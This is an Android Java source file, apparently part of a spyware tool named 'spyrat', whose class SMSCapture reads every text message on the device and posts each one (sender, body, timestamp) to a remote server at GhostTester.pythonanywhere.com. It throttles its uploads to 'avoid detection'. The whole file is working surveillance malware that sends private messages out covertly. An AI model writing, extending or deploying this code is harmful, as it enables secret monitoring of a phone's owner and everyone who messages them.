package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;
import org.json.JSONObject;

public class SMSCapture {
    private static final String TAG = "SpyratSMS";
    
    public static void collectAndSendSMS(Context context, String deviceId, String investigatorCode) {
        try {
            Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject smsData = new JSONObject();
                    smsData.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    smsData.put("message", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    smsData.put("type", getSMSType(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                    
                    // Send individual SMS
                    sendSMSData(deviceId, investigatorCode, smsData);
                    count++;
                    
                    // Pause to avoid detection
                    if (count % 10 == 0) Thread.sleep(2000);
                }
                cursor.close();
                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ SMS capture error: " + e.getMessage());
        }
    }
    
    private static String getSMSType(int smsType) {
        switch (smsType) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
            default: return "unknown";
        }
    }
    
    private static void sendSMSData(String deviceId, String investigatorCode, JSONObject smsData) {
        try {
            JSONObject postData = new JSONObject();
            postData.put("device_id", deviceId);
            postData.put("investigator_code", investigatorCode);
            postData.put("data_type", "sms");
            postData.put("data_content", smsData);
            
            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
        } catch (Exception e) {
            Log.e(TAG, "❌ SMS send error: " + e.getMessage());
        }
    }
}
